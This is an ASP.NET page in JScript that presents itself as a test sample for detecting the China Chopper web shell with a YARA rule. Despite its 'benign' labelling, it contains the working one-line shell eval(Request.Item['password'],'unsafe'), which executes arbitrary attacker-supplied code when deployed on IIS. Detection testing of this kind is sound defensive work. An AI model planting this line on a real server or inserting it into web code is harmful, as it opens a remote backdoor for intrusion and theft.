<%@ Page Language="Jscript"%><%
    // This is a sample file to test the China Chopper web shell detection.
    // The following line is the malicious payload that the YARA rule looks for.
    // In a real attack, this would be the only line in the file.

    eval(Request.Item["password"],"unsafe");

    // The rest of this file is for context and comments.
    // A real China Chopper shell is typically only one line.
%>

<html>
<head>
    <title>Benign Test Page</title>
</head>
<body>
    <h1>This is a safe test file.</h1>
    <p>It contains a string signature used to detect the China Chopper web shell for security testing purposes.</p>
</body>
</html>
